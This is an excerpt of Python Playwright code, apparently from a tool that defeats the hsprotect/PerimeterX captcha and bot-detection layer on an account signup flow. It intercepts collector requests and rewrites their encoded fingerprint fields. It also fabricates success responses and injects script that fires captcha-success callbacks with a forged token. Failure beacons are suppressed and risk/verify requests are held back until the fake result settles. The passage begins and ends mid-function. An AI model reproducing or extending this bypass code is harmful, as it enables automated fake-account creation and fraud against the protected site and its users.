            if ev.get("t") == "aRVTHy91Wio=" and d.get("R3c9PQEXNg8=") != target_arv:
                d["R3c9PQEXNg8="] = target_arv
                changed = True
            elif ev.get("t") == "KnpQcG8ZVUI=" and d.get("R3c9PQEXNg8=") != target_knp:
                d["R3c9PQEXNg8="] = target_knp
                changed = True
            if target_xghm is not None and ev.get("t") in ("aRVTHy91Wio=", "KnpQcG8ZVUI=", "PX561", "JDBeOmJSWwo=", "BFA+GkExMiE=") and "XGhmYhkIbVU=" in d and d.get("XGhmYhkIbVU=") != target_xghm:
                d["XGhmYhkIbVU="] = target_xghm
                changed = True
    elif mode != "template":
        changed = _normalize_final_aux_r3(events, qs=qs) or changed

    if mode != "template":
        px_r3 = None
        px_s3 = None
        for ev in events:
            if isinstance(ev, dict) and ev.get("t") == "PX561" and isinstance(ev.get("d"), dict):
                px_r3 = ev["d"].get("R3c9PQEXNg8=")
                px_s3 = ev["d"].get("S3sxMQ0YNQo=")
                break
        if px_r3 is not None:
            for ev in events:
                d = ev.get("d") if isinstance(ev, dict) else None
                if ev.get("t") in ("JDBeOmJSWwo=", "BFA+GkExMiE=") and isinstance(d, dict) and d.get("R3c9PQEXNg8=") != px_r3:
                    d["R3c9PQEXNg8="] = px_r3
                    changed = True
                if ev.get("t") == "JDBeOmJSWwo=" and isinstance(d, dict) and mode in ("ads_long", "natural_long", "old_1s"):
                    if px_s3 is not None and d.get("S3sxMQ0YNQo=") != px_s3:
                        d["S3sxMQ0YNQo="] = px_s3
                        changed = True
                    if mode == "natural_long":
                        target_stk = 590 + _stable_int(str(qs), "nat-jd-stk", mod=41)
                    elif mode == "old_1s":
                        target_stk = 630 + _stable_int(str(qs), "old1s-jd-stk", mod=41)
                    else:
                        target_stk = 370 + _stable_int(str(qs), "ads-jd-stk", mod=41)
                    if "STk4fwxXPE4=" in d and d.get("STk4fwxXPE4=") != target_stk:
                        d["STk4fwxXPE4="] = target_stk
                        changed = True

    after = [ev.get("t") for ev in (events or []) if isinstance(ev, dict)]
    return changed, {"mode": mode, "before": before, "after_tags": after}


def _collector_response_key(tag: str) -> int:
    tag = str(tag or "YjIYfyxJHRR9")
    value = 0
    for ch in tag:
        value = (31 * value + ord(ch)) % 2147483647
    return (value % 900 + 100) % 128


def _encode_collector_response_body(sent_body: str, parts: list[str]) -> str:
    form = parse_form_preserve_payload(sent_body or "")
    key = _collector_response_key(form.get("tag"))
    text = "~~~~".join(str(p) for p in parts if p)
    raw = bytes((ord(ch) ^ key) & 0xFF for ch in text)
    ob = base64.b64encode(raw).decode("ascii")
    return json.dumps({"do": None, "ob": ob}, separators=(",", ":"))


def _trigger_hsprotect_success_signals(page, qi: str = "", reason: str = "collector_success"):
    """
    Best-effort bridge from an accepted/optimistic hsprotect proof back into the
    visible signup page.

    The collector response alone is not always enough in accelerated runs: the
    captcha iframe can re-challenge even after the normalized proof is accepted.
    Manual/successful runs expose `_pxOnCaptchaSuccess` in the hsprotect frame;
    invoke that callback after final proof success, then mirror a small set of
    status-0 events/messages for host integrations that listen outside the frame.
    """
    token = f"probe-token-{int(time.time() * 1000)}"
    results = []
    script = r"""
({token, qi, reason}) => {
  const out = [];
  const safe = (v) => {
    try { return JSON.stringify(v).slice(0, 260); } catch (_) { return String(v).slice(0, 260); }
  };
  const record = (kind, data) => {
    try { out.push(Object.assign({kind}, data || {})); } catch (_) {}
  };
  const detail = {
    captchaToken: token,
    token,
    appID: "PXzC5j78di",
    appId: "PXzC5j78di",
    status: 0,
    success: true,
    qi,
    reason
  };
  try {
    if (typeof window._pxOnCaptchaSuccess === "function") {
      const variants = [
        [token],
        [token, false],
        [{ token, captchaToken: token, status: 0, appID: "PXzC5j78di" }]
      ];
      let called = false;
      for (const args of variants) {
        if (called) break;
        try {
          window._pxOnCaptchaSuccess.apply(window, args);
          called = true;
          record("callback", { name: "_pxOnCaptchaSuccess", argc: args.length });
        } catch (e) {
          record("callback_error", { name: "_pxOnCaptchaSuccess", argc: args.length, error: String(e && e.message || e) });
        }
      }
    }
  } catch (e) {
    record("callback_error", { name: "_pxOnCaptchaSuccess_outer", error: String(e && e.message || e) });
  }
  try {
    const ownStringKeys = obj => {
      try { return Reflect.ownKeys(obj).filter(k => typeof k === "string"); } catch (_) {}
      try { return Object.getOwnPropertyNames(obj); } catch (_) {}
      return [];
    };
    const pxFunctionKeys = obj => {
      try { return ownStringKeys(obj).filter(k => /^PX\d+$/.test(k) && typeof obj[k] === "function"); } catch (_) {}
      return [];
    };
    const namespaces = [];
    const seen = new Set();
    for (const ns of ownStringKeys(window)) {
      let obj = null;
      try { obj = window[ns]; } catch (_) { continue; }
      if (!obj || (typeof obj !== "object" && typeof obj !== "function")) continue;
      if (/^_?PX/i.test(ns) || ns === "PX" || /PXzC5j78di/i.test(ns) || pxFunctionKeys(obj).length) {
        if (!seen.has(ns)) {
          seen.add(ns);
          namespaces.push(ns);
        }
      }
    }
    if (pxFunctionKeys(window).length) namespaces.push("__window__");
    for (const ns of namespaces) {
      const obj = ns === "__window__" ? window : window[ns];
      if (!obj) continue;
      if (typeof obj.PX764 === "function") {
        try {
          obj.PX764("0", null, null, null);
          record("px_api", { ns, name: "PX764", mode: "status0" });
        } catch (e) {
          record("px_api_error", { ns, name: "PX764", error: String(e && e.message || e) });
        }
      }
      if (typeof obj.PX11659 === "function") {
        try {
          obj.PX11659(token, false);
          record("px_api", { ns, name: "PX11659", mode: "token_false" });
        } catch (e) {
          record("px_api_error", { ns, name: "PX11659", error: String(e && e.message || e) });
        }
      }
    }
  } catch (e) {
    record("px_scan_error", { error: String(e && e.message || e) });
  }
  try {
    const eventNames = [
      "captcha_success",
      "captchaSuccess",
      "hsprotect:captcha_success",
      "pxCaptchaSuccess",
      "perimeterx:captcha_success"
    ];
    for (const name of eventNames) {
      try {
        window.dispatchEvent(new CustomEvent(name, { detail }));
        document.dispatchEvent(new CustomEvent(name, { detail }));
        record("event", { name });
      } catch (e) {
        record("event_error", { name, error: String(e && e.message || e) });
      }
    }
  } catch (_) {}
  try {
    const messages = [
      detail,
      { type: "captcha_success", detail },
      { type: "pxCaptchaSuccess", payload: detail },
      { event: "captcha_success", status: 0, captchaToken: token, token, appID: "PXzC5j78di" },
      { action: "captcha_close", status: 0, captchaToken: token, token, appID: "PXzC5j78di" }
    ];
    const targets = [];
    try { if (window.parent && window.parent !== window) targets.push(["parent", window.parent]); } catch (_) {}
    try { if (window.top && window.top !== window && window.top !== window.parent) targets.push(["top", window.top]); } catch (_) {}
    try { if (window.opener) targets.push(["opener", window.opener]); } catch (_) {}
    for (const [label, target] of targets) {
      for (const msg of messages) {
        try {
          target.postMessage(msg, "*");
          record("postMessage", { target: label, preview: safe(msg) });
        } catch (e) {
          record("postMessage_error", { target: label, error: String(e && e.message || e) });
        }
      }
    }
  } catch (_) {}
  return { href: location.href, out };
}
"""
    try:
        for idx, frame in enumerate(page.frames):
            try:
                frame_url = getattr(frame, "url", "") or ""
                if idx != 0 and "hsprotect.net" not in frame_url and frame_url != "about:blank":
                    continue
                res = frame.evaluate(script, {"token": token, "qi": str(qi or ""), "reason": reason})
                results.append({"idx": idx, "url": frame_url[:160], "result": res})
            except Exception as exc:
                results.append({"idx": idx, "url": (getattr(frame, "url", "") or "")[:160], "error": repr(exc)[:180]})
        compact = [
            {
                "idx": r.get("idx"),
                "url": r.get("url"),
                "events": len(((r.get("result") or {}).get("out") or [])) if isinstance(r.get("result"), dict) else 0,
                "error": r.get("error"),
            }
            for r in results
        ]
        print(f"[Probe] hsprotect success signal fired qi={qi} reason={reason}: {json.dumps(compact, ensure_ascii=False)[:1200]}")
    except Exception as exc:
        print(f"[Probe] hsprotect success signal failed qi={qi} reason={reason}: {exc!r}")
    return results


def attach_y1nz_preproof_normalizer(
    page,
    final_proof_mode: str = "minimal",
    preserve_final_bfa: bool = False,
    optimistic_final_success: bool = False,
    optimistic_w0_success: bool = False,
    rewrite_final_result_success: bool = False,
    trigger_final_success_signals: bool = False,
    defer_final_result_to_w0: bool = False,
    defer_final_result_to_w0_wait_ms: int = 2500,
    neutral_final_fetch_w0: bool = False,
    neutral_final_merge_w0_success: bool = False,
    neutral_final_cached_w0_success: bool = False,
    neutral_final_cached_rich_w0_success: bool = False,
    real_final_neutral_w0_success: bool = False,
    session_cached_rich_final_success: bool = False,
    session_cached_rich_w0_success: bool = False,
    session_cached_rich_final_and_w0_success: bool = False,
    warmup_neutral_then_rich_final_and_w0_success: bool = False,
    session_cached_rich_initial_w0_delay_ms: int = 0,
    async_early_cached_rich_w0: bool = False,
    final_response_delay_ms: int = 0,
    suppress_unforced_final_for_synthetic: bool = False,
    delay_captcha_close_ms: int = 0,
    risk_verify_gate_ms: int = 0,
    risk_verify_gate_timeout_ms: int = 1500,
    risk_verify_human_success_age_ms: int = 0,
    risk_verify_human_success_timeout_ms: int = 0,
):
    """
    Python-level request normalizer for the ch_ctx=1 Y1NZ bootstrap.

    It routes only hsprotect collector POST bodies, decodes the payload, applies
    a narrow manual-success fingerprint baseline to the second Y1NZ packet, then
    re-encodes the payload and pc.  No JS is injected before proof generation.
    """
    log_path = Path("Results") / "protocol_runtime" / f"{datetime.now().strftime('%Y%m%d_%H%M%S')}_route_normalizer.jsonl"
    deferred_final_success_by_qi: dict[str, dict] = {}
    optimistic_w0_parts_by_qi: dict[str, list[str]] = {}
    neutral_final_fetch_w0_by_qi: dict[str, dict] = {}
    pending_early_w0_by_qi: dict[str, dict] = {}
    same_qi_rich_response_parts_by_qi: dict[str, list[str]] = {}
    session_rich_final_parts: list[str] = []
    session_rich_final_cache_qi: str = ""
    if warmup_neutral_then_rich_final_and_w0_success:
        session_cached_rich_final_and_w0_success = True
    session_final_px561_count = {"count": 0}
    final_fetch_guard = FINAL_FETCH_GUARD_STATE
    final_fetch_guard.clear()
    final_fetch_guard.update(
        {
            "pending": 0,
            "guard_until": 0.0,
            "last_qi": "",
            "last_seq": "",
            "last_result": "",
            "last_result_at": 0.0,
            "last_final_response_at": 0.0,
            "last_scores": [],
        }
    )
    w0_parts_cache_path = Path("Results") / "protocol_runtime" / "last_real_w0_parts.json"
    final_parts_cache_path = Path("Results") / "protocol_runtime" / "last_real_final_parts.json"

    def load_cached_final_parts() -> list[str]:
        try:
            cache = json.loads(final_parts_cache_path.read_text(encoding="utf-8"))
            return [str(p) for p in list(cache.get("parts") or [])]
        except Exception:
            return []

    def load_cached_final_neutral_parts() -> list[str]:
        try:
            cache = json.loads(final_parts_cache_path.read_text(encoding="utf-8"))
            parts = list(cache.get("parts") or [])
        except Exception:
            parts = []
        neutral = [
            p for p in parts
            if not str(p).startswith("oIIoIooo|")
            and not str(p).startswith("IoIoIo|score|0|")
        ]
        if not any(str(p).startswith("IoIoIo|score|") for p in neutral):
            neutral.insert(0, "IoIoIo|score|1|binary")
        return neutral or ["IoIoIo|score|1|binary"]

    def neutralize_final_parts(parts: list[str]) -> list[str]:
        neutral = [
            p for p in list(parts or [])
            if not str(p).startswith("oIIoIooo|")
            and not str(p).startswith("IoIoIo|score|0|")
        ]
        if not any(str(p).startswith("IoIoIo|score|") for p in neutral):
            neutral.insert(0, "IoIoIo|score|1|binary")
        return neutral or ["IoIoIo|score|1|binary"]

    def force_success_final_parts(parts: list[str]) -> list[str]:
        # The only fully accepted live trace did not simply replace
        # score|1 with score|0.  Its rich final response kept the neutral
        # score/cookie material, then carried result|0 and a second score|0
        # around the _px3 token:
        #   score|1, cu, _pxde, result|0, _px3, score|0
        # Preserve that shape for same-session cached rich parts.
        src = [str(p) for p in list(parts or [])]
        neutral_scores = [p for p in src if p.startswith("IoIoIo|score|") and not p.startswith("IoIoIo|score|0|")]
        cu_parts = [p for p in src if p.startswith("IoIIIo|cu")]
        pxde_parts = [p for p in src if p.startswith("oIIoIIoo|_pxde|")]
        px3_parts = [p for p in src if p.startswith("IoooII|_px3|")]
        other_parts = [
            p for p in src
            if not p.startswith("IoIoIo|score|")
            and not p.startswith("IoIIIo|cu")
            and not p.startswith("oIIoIIoo|_pxde|")
            and not p.startswith("IoooII|_px3|")
            and not p.startswith("oIIoIooo|")
        ]
        out = []
        out.extend(neutral_scores or ["IoIoIo|score|1|binary"])
        out.extend(cu_parts)
        out.extend(pxde_parts)
        out.append("oIIoIooo|0")
        out.extend(px3_parts)
        out.append("IoIoIo|score|0|binary")
        out.extend(other_parts)
        return out

    def force_success_w0_parts(parts: list[str]) -> list[str]:
        # The accepted CreateAccount trace's decisive W0 response differs from
        # the rich final shape: W0 carried score|0 first, then cu/_pxde,
        # result|0, _px3, and a trailing score|0.  Keeping the neutral score|1
        # from the final cache yields HumanCaptcha_Success but the host keeps
        # reloading the iframe and never submits CreateAccount.
        src = [str(p) for p in list(parts or [])]
        cu_parts = [p for p in src if p.startswith("IoIIIo|cu")]
        pxde_parts = [p for p in src if p.startswith("oIIoIIoo|_pxde|")]
        px3_parts = [p for p in src if p.startswith("IoooII|_px3|")]
        other_parts = [
            p for p in src
            if not p.startswith("IoIoIo|score|")
            and not p.startswith("IoIIIo|cu")
            and not p.startswith("oIIoIIoo|_pxde|")
            and not p.startswith("IoooII|_px3|")
            and not p.startswith("oIIoIooo|")
        ]
        out = ["IoIoIo|score|0|binary"]
        out.extend(cu_parts)
        out.extend(pxde_parts)
        out.append("oIIoIooo|0")
        out.extend(px3_parts)
        out.append("IoIoIo|score|0|binary")
        out.extend(other_parts)
        return out

    def select_rich_parts_for_w0(qi_key: str) -> tuple[list[str], str]:
        """Pick the freshest rich token envelope for a synthetic W0 result0."""
        key = str(qi_key or "")
        if key and same_qi_rich_response_parts_by_qi.get(key):
            return list(same_qi_rich_response_parts_by_qi.get(key) or []), "same_qi_preproof_response"
        if session_rich_final_cache_qi and session_rich_final_cache_qi == key and session_rich_final_parts:
            return list(session_rich_final_parts), "same_qi_final_response"
        if session_rich_final_parts:
            return list(session_rich_final_parts), "session_final_response"
        cached = load_cached_final_parts()
        if cached:
            return cached, "disk_last_final_response"
        return [], ""
    try:
        log_path.parent.mkdir(parents=True, exist_ok=True)
        print(f"[Probe] route normalizer log={log_path}")
    except Exception:
        pass

    def write_log(record: dict):
        try:
            with log_path.open("a", encoding="utf-8") as fh:
                fh.write(json.dumps(record, ensure_ascii=False, default=str) + "\n")
        except Exception:
            pass

    def summarize_events(events: list) -> dict:
        tags = [ev.get("t") for ev in (events or []) if isinstance(ev, dict)]
        out = {"tags": tags}
        try:
            px = next((ev.get("d") for ev in events if isinstance(ev, dict) and ev.get("t") == "PX561"), None)
            if isinstance(px, dict):
                out["px561"] = {
                    "e": px.get("eEgJDj4mCD4="),
                    "z": px.get("ZjoXPCNQGQw="),
                    "wi": px.get("WiZrIB9LbBU="),
                    "ui": px.get("Ui5jKBREZxs="),
                    "r3": px.get("R3c9PQEXNg8="),
                    "xghm": px.get("XGhmYhkIbVU="),
                    "hu": px.get("HUlnQ1slanM="),
                    "dz_len": len(px.get("DzN+dUlTekE=") or []),
                    "click": any(
                        isinstance(x, dict) and x.get("PX12343") == "click"
                        for x in (px.get("DzN+dUlTekE=") or [])
                    ),
                }
            bfa = next((ev.get("d") for ev in events if isinstance(ev, dict) and ev.get("t") == "BFA+GkExMiE="), None)
            if isinstance(bfa, dict):
                out["bfa"] = {
                    "hu": bfa.get("HUlnQ1slanM="),
                    "r3": bfa.get("R3c9PQEXNg8="),
                    "xghm": bfa.get("XGhmYhkIbVU="),
                    "cx_len": len(bfa.get("CXVzP0wQeg0=") or []) if isinstance(bfa.get("CXVzP0wQeg0="), list) else None,
                    "ef_keys": list((bfa.get("EFwqFlU4ISQ=") or {}).keys()) if isinstance(bfa.get("EFwqFlU4ISQ="), dict) else None,
                }
        except Exception:
            pass
        try:
            from project_knp_scope import final_invariants

            if "PX561" in tags:
                out["final_invariants"] = final_invariants(events)
        except Exception as exc:
            out["final_invariants_error"] = repr(exc)[:160]
        return out

    def get_post_data(request):
        try:
            data = request.post_data
            if callable(data):
                data = request.post_data()
            return data or ""
        except Exception:
            return ""

    def remove_form_field_preserve(body: str, key: str) -> str:
        prefix = str(key) + "="
        return "&".join(part for part in str(body or "").split("&") if not part.startswith(prefix))

    def maybe_delay_final_response(log_record: dict, reason: str):
        delay_ms = max(0, int(final_response_delay_ms or 0))
        if not delay_ms:
            return
        try:
            log_record["final_response_delay_ms"] = delay_ms
            log_record["final_response_delay_reason"] = reason
            time.sleep(delay_ms / 1000.0)
        except Exception as exc:
            log_record["final_response_delay_error"] = repr(exc)[:160]

    def fulfill_pending_early_w0(qi_key_for_final: str, final_log_record: dict, reason: str) -> bool:
        """Fulfill a W0 route that arrived before final, from the final handler.

        Returning from the W0 route handler without fulfilling keeps the actual
        XHR pending while allowing the browser to emit PX561.  Fulfilling that
        saved route here runs on Playwright's sync greenlet, unlike a background
        Python thread, so it avoids the "Cannot switch to a different thread"
        error while preserving W0-before-final request ordering.
        """
        if not qi_key_for_final:
            return False
        pending = pending_early_w0_by_qi.pop(str(qi_key_for_final), None)
        if not pending:
            return False
        route_obj = pending.get("route")
        response_body = pending.get("response_body") or ""
        w0_success_parts = list(pending.get("parts") or [])
        wait_started = float(pending.get("started_at") or time.time())
        min_delay_ms = max(0, int(pending.get("min_delay_ms") or 0))
        try:
            elapsed_before_ms = int((time.time() - wait_started) * 1000)
            if min_delay_ms and elapsed_before_ms < min_delay_ms:
                time.sleep((min_delay_ms - elapsed_before_ms) / 1000.0)
            if isinstance(neutral_final_fetch_w0_by_qi.get(str(qi_key_for_final)), dict):
                neutral_final_fetch_w0_by_qi[str(qi_key_for_final)]["w0_fulfilled"] = True
                neutral_final_fetch_w0_by_qi[str(qi_key_for_final)]["pending_early_w0_fulfilled_from_final"] = True
            route_obj.fulfill(
                status=200,
                headers={
                    "content-type": "application/json; charset=utf-8",
                    "access-control-allow-origin": "https://iframe.hsprotect.net",
                    "access-control-allow-credentials": "true",
                },
                body=response_body,
            )
            elapsed_ms = int((time.time() - wait_started) * 1000)
            item = {
                "ts": datetime.now().isoformat(),
                "url": pending.get("url"),
                "method": pending.get("method"),
                "qi": qi_key_for_final,
                "seq": pending.get("seq"),
                "rsc": pending.get("rsc"),
                "event": "pending_early_cached_rich_w0_fulfilled_from_final",
                "reason": reason,
                "elapsed_ms": elapsed_ms,
                "response_status": 200,
                "response_len": len(response_body),
                "cached_source": pending.get("cached_source"),
                "response_decoded_merged": {
                    "parts": w0_success_parts,
                    "scores": [p for p in w0_success_parts if str(p).startswith("IoIoIo|score|")],
                    "results": [p for p in w0_success_parts if str(p).startswith("oIIoIooo|")],
                    "cached_parts": pending.get("cached_parts"),
                },
            }
            item["risk_verify_gate_snapshot"] = remember_final_result_for_risk_gate(
                str(qi_key_for_final or ""),
                str(pending.get("seq") or ""),
                item.get("response_decoded_merged"),
                200,
                "pending_early_cached_rich_w0_success",
            )
            write_log(item)
            try:
                final_log_record.setdefault("pending_early_w0_fulfilled", []).append(item)
            except Exception:
                final_log_record["pending_early_w0_fulfilled"] = True
            print(
                "[Probe] pending early cached rich W0 fulfilled from final "
                f"qi={qi_key_for_final} seq={pending.get('seq')} elapsed_ms={elapsed_ms} reason={reason}"
            )
            return True
        except Exception as exc:
            pending_early_w0_by_qi[str(qi_key_for_final)] = pending
            item = {
                "ts": datetime.now().isoformat(),
                "url": pending.get("url"),
                "method": pending.get("method"),
                "qi": qi_key_for_final,
                "seq": pending.get("seq"),
                "rsc": pending.get("rsc"),
                "event": "pending_early_cached_rich_w0_fulfill_error",
                "reason": reason,
                "error": repr(exc)[:300],
            }
            write_log(item)
            final_log_record["pending_early_w0_fulfill_error"] = item["error"]
            print(f"[Probe] pending early cached rich W0 fulfill error: {exc!r}")
            return False

    def remember_final_result_for_risk_gate(qi_key: str, seq: str, decoded_response, status, reason: str) -> dict:
        """Remember the latest real/synthetic final PX561 outcome for risk/verify serialization.

        The host sends the second risk/verify request immediately after the
        iframe consumes the collector response.  In unstable 1s traces this can
        race the collector/backend handoff and return a fresh HumanCaptcha even
        when the final response carried result|0.  Keep a tiny shared state so
        the risk/verify route can wait for a result|0 and a configurable
        propagation window before forwarding the host request.
        """
        parts = [str(p) for p in ((decoded_response or {}).get("parts") or [])]
        results = [str(p) for p in ((decoded_response or {}).get("results") or [])]
        scores = [str(p) for p in ((decoded_response or {}).get("scores") or [])]
        result = ""
        for item in results:
            if item.startswith("oIIoIooo|"):
                result = item.split("|", 1)[1] if "|" in item else item
                break
        now = time.time()
        final_fetch_guard["last_qi"] = str(qi_key or "")
        final_fetch_guard["last_seq"] = str(seq or "")
        final_fetch_guard["last_final_response_at"] = now
        final_fetch_guard["last_scores"] = scores
        if result:
            final_fetch_guard["last_result"] = result
            final_fetch_guard["last_result_at"] = now
        snapshot = {
            "qi": final_fetch_guard.get("last_qi") or "",
            "seq": final_fetch_guard.get("last_seq") or "",
            "status": status,
            "reason": reason,
            "result": result,
            "scores": scores,
            "parts_count": len(parts),
            "remembered_at": datetime.now().isoformat(),
        }
        return snapshot

    def maybe_gate_risk_verify(route, request, url: str):
        gate_ms = max(0, int(risk_verify_gate_ms or 0))
        human_success_age_ms = max(0, int(risk_verify_human_success_age_ms or 0))
        human_success_timeout_ms = max(0, int(risk_verify_human_success_timeout_ms or 0))
        if gate_ms <= 0 and human_success_age_ms <= 0:
            return False
        if request.method != "POST" or "/api/v1.0/risk/verify" not in url:
            return False

        body = get_post_data(request)
        has_human_solution = False
        token_len = 0
        try:
            data = json.loads(body or "{}")
            token_len = len(str(data.get("continuationToken") or ""))
            sol = data.get("challengeSolution")
            has_human_solution = isinstance(sol, dict) and str(sol.get("challengeType") or "") == "HumanCaptcha"
        except Exception:
            data = {}

        # The first risk/verify asks for a challenge and must stay untouched.
        # Gate only the post-captcha verify carrying challengeSolution.
        if not has_human_solution:
            return False

        timeout_ms = max(
            gate_ms + human_success_timeout_ms + human_success_age_ms + 250,
            int(risk_verify_gate_timeout_ms or 0),
        )
        start = time.time()
        deadline = start + timeout_ms / 1000.0
        waited_pending_ms = 0
        waited_result_ms = 0
        waited_propagation_ms = 0
        waited_human_success_ms = 0
        human_success_seen = False
        human_success_age = 0
        human_success_seen_at = 0.0

        while int(final_fetch_guard.get("pending") or 0) > 0 and time.time() < deadline:
            time.sleep(0.02)
        waited_pending_ms = int((time.time() - start) * 1000)

        # If the final handler has just completed fetch() but has not decoded
        # the response yet, give it a short chance to publish last_result.
        result_wait_start = time.time()
        while (
            not final_fetch_guard.get("last_result")
            and (final_fetch_guard.get("last_qi") or "")
            and time.time() < deadline
        ):
            time.sleep(0.02)
        waited_result_ms = int((time.time() - result_wait_start) * 1000)

        result = str(final_fetch_guard.get("last_result") or "")
        result_at = float(final_fetch_guard.get("last_result_at") or 0.0)
        if result == "0" and result_at > 0:
            since_ms = int((time.time() - result_at) * 1000)
            extra_ms = max(0, gate_ms - since_ms)
            if extra_ms > 0:
                # This delay is deliberately bounded by a separate timeout so
                # an unexpected missing result does not hang the registration.
                time.sleep(extra_ms / 1000.0)
                waited_propagation_ms = extra_ms

        # First-pass flakes are not collector proof failures: the W0/final side
        # has already produced result|0, but the host's post-captcha risk/verify
        # can still reach the backend before the HumanCaptcha_Success telemetry
        # has been emitted/settled.  Optionally serialize this request behind a
        # fresh HumanCaptcha_Success signal from the current collector result.
        # Use result_at as the freshness anchor so a previous attempt's success
        # beacon cannot satisfy a new challenge.
        if human_success_age_ms > 0 and result == "0" and result_at > 0:
            human_wait_start = time.time()
            human_deadline = min(deadline, human_wait_start + max(0.05, human_success_timeout_ms / 1000.0))

            def latest_fresh_human_success() -> tuple[bool, int, float]:
                try:
                    capture_state = getattr(page, "_pxprobe_collector_capture", None) or {}
                except Exception:
                    capture_state = {}
                signals = list((capture_state.get("signals") if isinstance(capture_state, dict) else []) or [])
                # Allow a tiny negative tolerance because Playwright request
                # callbacks can be timestamped a few ms around the W0 handler.
                min_seen_at = result_at - 0.25
                for sig in reversed(signals):
                    try:
                        if sig.get("label") != "HumanCaptcha_Success":
                            continue
                        seen_at = float(sig.get("seen_at") or 0.0)
                        if seen_at <= 0 or seen_at < min_seen_at:
                            continue
                        age = max(0, int((time.time() - seen_at) * 1000))
                        return True, age, seen_at
                    except Exception:
                        continue
                return False, 0, 0.0

            while time.time() < human_deadline:
                ok, age, seen_at = latest_fresh_human_success()
                human_success_seen = ok
                human_success_age = age
                human_success_seen_at = seen_at
                if ok and age >= human_success_age_ms:
                    break
                time.sleep(0.02)
            # One final snapshot for logging, including timeout/no-signal cases.
            ok, age, seen_at = latest_fresh_human_success()
            human_success_seen = ok
            human_success_age = age
            human_success_seen_at = seen_at
            waited_human_success_ms = int((time.time() - human_wait_start) * 1000)

        record = {
            "ts": datetime.now().isoformat(),
            "url": url,
            "method": request.method,
            "event": "risk_verify_gate",
            "gate_ms": gate_ms,
            "timeout_ms": timeout_ms,
            "token_len": token_len,
            "has_human_solution": has_human_solution,
            "pending_wait_ms": waited_pending_ms,
            "result_wait_ms": waited_result_ms,
            "propagation_wait_ms": waited_propagation_ms,
            "human_success_age_target_ms": human_success_age_ms,
            "human_success_timeout_ms": human_success_timeout_ms,
            "human_success_wait_ms": waited_human_success_ms,
            "human_success_seen": human_success_seen,
            "human_success_age_ms": human_success_age,
            "human_success_seen_at": (
                datetime.fromtimestamp(human_success_seen_at).isoformat()
                if human_success_seen_at
                else ""
            ),
            "last_final_qi": final_fetch_guard.get("last_qi") or "",
            "last_final_seq": final_fetch_guard.get("last_seq") or "",
            "last_result": final_fetch_guard.get("last_result") or "",
            "last_scores": final_fetch_guard.get("last_scores") or [],
            "elapsed_ms": int((time.time() - start) * 1000),
        }
        write_log(record)
        print(
            "[Probe] risk/verify gated "
            f"elapsed_ms={record['elapsed_ms']} result={record['last_result']} "
            f"qi={record['last_final_qi']} seq={record['last_final_seq']} "
            f"humanSuccess={record['human_success_seen']} age={record['human_success_age_ms']}"
        )
        route.continue_()
        return True

    def handler(route, request):
        nonlocal session_rich_final_cache_qi
        url = request.url
        try:
            if maybe_gate_risk_verify(route, request, url):
                return None
            if (
                int(delay_captcha_close_ms or 0) > 0
                and request.method == "GET"
                and "iframe.hsprotect.net/px/captcha_close" in url
                and "status=-1" in url
            ):
                now = time.time()
                guarded = int(final_fetch_guard.get("pending") or 0) > 0 or now < float(final_fetch_guard.get("guard_until") or 0)
                if guarded:
                    delay_ms = max(0, int(delay_captcha_close_ms or 0))
                    start_wait = time.time()
                    deadline = start_wait + delay_ms / 1000.0
                    while int(final_fetch_guard.get("pending") or 0) > 0 and time.time() < deadline:
                        time.sleep(0.05)
                    # If the final PX561 response resolved to result|0 while
                    # the close=-1 request was held, do not let that failure
                    # beacon/navigation reach the client path.  Continuing it
                    # after result0 can still trip the iframe retry path before
                    # the host submits CreateAccount.
                    pending_after_wait = int(final_fetch_guard.get("pending") or 0) > 0
                    suppress_close = str(final_fetch_guard.get("last_result") or "") == "0" or pending_after_wait
                    suppress_reason = (
                        "result0"
                        if str(final_fetch_guard.get("last_result") or "") == "0"
                        else ("pending_final_after_delay" if pending_after_wait else "")
                    )
                    record = {
                        "ts": datetime.now().isoformat(),
                        "url": url,
                        "method": request.method,
                        "event": "captcha_close_minus1_suppressed" if suppress_close else "captcha_close_minus1_delayed",
                        "delay_ms": delay_ms,
                        "elapsed_ms": int((time.time() - start_wait) * 1000),
                        "pending_final_fetch": int(final_fetch_guard.get("pending") or 0),
                        "suppress_reason": suppress_reason,
                        "last_final_qi": final_fetch_guard.get("last_qi") or "",
                        "last_final_seq": final_fetch_guard.get("last_seq") or "",
                        "last_result": final_fetch_guard.get("last_result") or "",
                        "last_scores": final_fetch_guard.get("last_scores") or [],
                    }
                    write_log(record)
                    if suppress_close:
                        print(
                            "[Probe] suppressed captcha_close status=-1 "
                            f"reason={suppress_reason} elapsed_ms={record['elapsed_ms']} "
                            f"qi={record['last_final_qi']} seq={record['last_final_seq']}"
                        )
                        return route.fulfill(
                            status=204,
                            headers={
                                "access-control-allow-origin": "https://iframe.hsprotect.net",
                                "access-control-allow-credentials": "true",
                            },
                            body="",
                        )
                    print(
                        "[Probe] delayed captcha_close status=-1 while final response is pending/recent "
                        f"elapsed_ms={record['elapsed_ms']} delay_ms={delay_ms} "
                        f"qi={record['last_final_qi']} seq={record['last_final_seq']}"
                    )
                    return route.continue_()
                return route.continue_()
            if request.method != "POST" or "collector-" not in url or "hsprotect.net" not in url:
                return route.continue_()
            body = get_post_data(request)
            if "payload=" not in body or "uuid=" not in body or "appId=PXzC5j78di" not in body:
                return route.continue_()
            form = parse_form_preserve_payload(body)
            meta = decode_payload_meta_from_form(form)
            events = meta.get("events") or []
            before_summary = summarize_events(events)
            qi_key = str(meta.get("qi") or "")
            forced_bypass = "pxprobe_force=1" in body
            if forced_bypass:
                clean_body = remove_form_field_preserve(body, "pxprobe_force")
                log_record = {
                    "ts": datetime.now().isoformat(),
                    "url": url,
                    "method": request.method,
                    "qi": meta.get("qi"),
                    "seq": form.get("seq"),
                    "rsc": form.get("rsc"),
                    "old_len": len(body),
                    "new_len": len(clean_body),
                    "changes": [{"force_synthetic_final_bypass_normalizer": True}],
                    "before": before_summary,
                    "after": before_summary,
                    "forced_bypass": True,
                }
                try:
                    response = route.fetch(post_data=clean_body)
                    response_body = response.text()
                    log_record["response_status"] = response.status
                    log_record["response_len"] = len(response_body or "")
                    try:
                        from analyze_protocol_run import _decode_collector_response

                        log_record["response_decoded"] = _decode_collector_response(response_body, clean_body)
                    except Exception as dec_exc:
                        log_record["response_decode_error"] = repr(dec_exc)[:200]
                    write_log(log_record)
                    decoded = log_record.get("response_decoded") or {}
                    print(
                        "[Probe] force synthetic final bypassed route normalizer "
                        f"qi={meta.get('qi')} seq={form.get('seq')} "
                        f"scores={decoded.get('scores')} results={decoded.get('results')}"
